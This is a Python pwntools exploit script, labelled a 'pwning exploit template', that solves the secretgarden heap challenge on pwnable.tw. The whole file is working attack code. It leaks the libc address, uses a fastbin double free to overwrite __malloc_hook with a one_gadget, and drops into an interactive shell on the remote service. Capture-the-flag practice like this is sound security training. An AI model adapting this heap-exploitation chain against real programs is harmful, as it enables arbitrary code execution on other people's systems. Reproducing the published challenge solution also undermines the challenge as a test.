#
#	***************************
#	* Pwning exploit template *
#	* Arthor: Cobra           *
#	***************************
#

from pwn import *
import sys

def conn():
	local = 0
	debug = 0

	for arg in sys.argv[1:]:
		if arg in ('-h', '--help'):
			print('Usage: python ' + sys.argv[0] + ' <option> ...')
			print('Option:')
			print('        -h, --help:     Show help')
			print('        -l, --local:    Running on local')
			print('        -d, --debug:    Use gdb auto attach')
			exit(0)
		if arg in ('-l', '--local'):
			local = 1
		if arg in ('-d', '--debug'):
			debug = 1

	if local:
		s = process('./secretgarden_patched')
		if debug:
			gdb.attach(s, gdbscript='''
				brva 0x10A4
				c
			''')
		else:
			raw_input('DEBUG')
	else:
		s = remote('chall.pwnable.tw', 10203)

	return s

s = conn()

def debug():
	gdb.attach(s, gdbscript='''
		b* __libc_malloc
		b* __libc_realloc+20
		brva 0xCBB
		c
	''')

elf = ELF('secretgarden_patched')
libc = ELF('libc_64.so.6')

def Raise(n, name, color):
	s.sendlineafter(b'Your choice : ', b'1')
	s.sendlineafter(b'Length of the name :', n)
	s.sendlineafter(b'The name of flower :', name)
	s.sendlineafter(b'The color of the flower :', color)	

def Visit():
	s.sendlineafter(b'Your choice : ', b'2')

def Remove(n):
	s.sendlineafter(b'Your choice : ', b'3')
	s.sendlineafter(b'Which flower do you want to remove from the garden:', n)

Raise(b'256', b'A', b'0')
Raise(b'40', b'A', b'1')
Raise(b'40', b'A', b'2')
Remove(b'1')
Remove(b'0')
Raise(b'256', b'A' * 7, b'3')
Visit()

s.recvuntil(b'Name of the flower[3] :')
libc.address = int.from_bytes(s.recv(14)[8:], byteorder='little', signed=False) - 0x3c3b78
log.info('libc base: 0x%x', libc.address)

one_gadget = libc.address + 0xef6c4
log.info('one_gadget: 0x%x', one_gadget)
log.info('__malloc_hook: 0x%x', libc.symbols['__malloc_hook'])
realloc = libc.sym['realloc']
log.info('realloc: 0x%x', realloc)

Raise(b'96', b'A', b'4')
Raise(b'96', b'A', b'5')

Remove(b'4')
Remove(b'5')
Remove(b'4')

Raise(b'96', p64(libc.symbols['__malloc_hook'] - 35), b'6')
Raise(b'96', b'A', b'7')
Raise(b'96', b'A', b'8')

#debug()

Raise(b'96', b'A' * 11 + p64(one_gadget) + p64(realloc + 20), b'9')
s.sendlineafter(b'Your choice : ', b'1')

s.interactive()
